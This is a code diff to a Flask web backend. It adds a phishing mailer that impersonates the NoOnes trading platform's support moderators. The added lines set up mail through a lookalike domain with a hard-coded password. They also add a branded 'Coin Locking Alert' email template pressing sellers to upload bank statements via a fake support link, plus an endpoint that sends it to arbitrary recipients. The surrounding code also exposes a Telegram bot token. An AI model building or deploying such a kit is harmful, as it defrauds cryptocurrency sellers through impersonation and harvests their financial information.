@@ -34,6 +34,15 @@ app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', os.urandom(24).hex())
 db = SQLAlchemy(app)
 CORS(app, resources={r"/*": {"origins": "https://sellbyit.com"}})app)
 
+# Email server configuration
+app.config['MAIL_SERVER'] = 'mail.moderator-support-team-noones.com'
+app.config['MAIL_PORT'] = 465
+app.config['MAIL_USE_SSL'] = True
+app.config['MAIL_USERNAME'] = 'support@moderator-support-team-noones.com'
+app.config['MAIL_PASSWORD'] = 'James1234JAMES'  # Replace with your actual password
+app.config['MAIL_DEFAULT_SENDER'] = 'moderator@noones-support-team.com'
+
+
 
 # Telegram configuration (optional; consider removing if not needed)
 bot_token = "8134604995:AAEJQxsj_CePVKKRFE-VePfDmlspbFEyj-I"
@@ -48,6 +57,114 @@ app.logger.setLevel(logging.INFO)
 
 bcrypt = Bcrypt(app)
 jwt = JWTManager(app)
+
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Account Action</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 20px;
+      background: linear-gradient(135deg, #e0f7e9, #a8e6cf); /* Light green gradient */
+      font-family: Arial, sans-serif;
+    }
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      background-color: #ffffff; /* White background for card */
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      border-top: 6px solid #00b050; /* Green accent border */
+    }
+    .header {
+      font-size: 26px;
+      font-weight: bold;
+      color: #00b050; /* Green header */
+      margin-bottom: 10px;
+    }
+    .subheader {
+      font-size: 20px;
+      color: #007a37; /* Darker green for subheader */
+      margin-bottom: 20px;
+    }
+    .content {
+      font-size: 16px;
+      color: #333333;
+      line-height: 1.6;
+      margin-bottom: 20px;
+    }
+    .button {
+      display: inline-block;
+      background-color: #00b050; /* Green button */
+      color: #ffffff;
+      text-decoration: none;
+      padding: 12px 24px;
+      border-radius: 5px;
+      font-weight: bold;
+      transition: background-color 0.3s ease;
+    }
+    .button:hover {
+      background-color: #008840;
+    }
+    .footer {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #666666;
+      border-top: 1px solid #dddddd;
+      padding-top: 10px;
+    }
+    /* Responsive adjustments */
+    @media (max-width: 600px) {
+      .container {
+        padding: 20px;
+        margin: 10px;
+      }
+      .header {
+        font-size: 22px;
+      }
+      .subheader {
+        font-size: 18px;
+      }
+      .content {
+        font-size: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">NoOnes Live Support</div>
+    <div class="subheader">Coin Locking Alert</div>
+    
+    <div class="content">
+      <p>Dear Seller, @Seller</p>
+      <p>Hello seller, we have noted you have a pending trade issue.</p>
+      <p>
+        Our system has sent an alert regarding a coin locking issue.
+        For a prompt resolution, please upload your evidence (e.g., Bank Statement Screenshot)
+        showing that you have not received any funds on our moderator platform.
+      </p>
+      <p>Thank you.</p>
+      <p>Moderator</p>
+    </div>
+    
+    <!-- Button linking to another page -->
+    <a href="https://noones-support-team.com" class="button">Cancel Trade</a>
+    
+    <div class="footer">
+      <p>Thanks,</p>
+      <p>NoOnes</p>
+    </div>
+  </div>
+</body>
+</html>
+"""
+
 
 
 # ✅ User Model
@@ -464,6 +581,42 @@ def create_notification():
     db.session.add(notification)
     db.session.commit()
     return jsonify({"message": "Notification created"}), 201
+
+@app.route("/send-email", methods=["POST"])
+def send_email():
+    """
+    Expects a JSON payload with:
+    {
+      "recipient": "recipient@example.com",
+      "seller": "John Doe"  # optional, default to "Seller" if not provided
+    }
+    """
+    data = request.get_json()
+    recipient = data.get("recipient")
+    seller = data.get("seller", "Seller")
+    
+    if not recipient:
+        return jsonify({"error": "Recipient is required"}), 400
+    
+    try:
+        # Replace the placeholder in the HTML template with the seller name
+        html_content = HTML_TEMPLATE.replace("@Seller", seller)
+        
+        msg = Message(
+            subject="Noones Moderator [Coin Locking Alert]. Action Required!",
+            recipients=[recipient]
+        )
+        # Assign the processed HTML content to msg.html
+        msg.html = html_content
+        
+        # Optional plain text fallback
+        msg.body = "Dear Seller, please check your email for further instructions regarding the coin locking alert."
+        
+        mail.send(msg)
+        return jsonify({"message": "Email sent successfully!"}), 200
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
 
 # ✅ Delete Notification
 @app.route('/notifications/<int:id>', methods=['DELETE'])
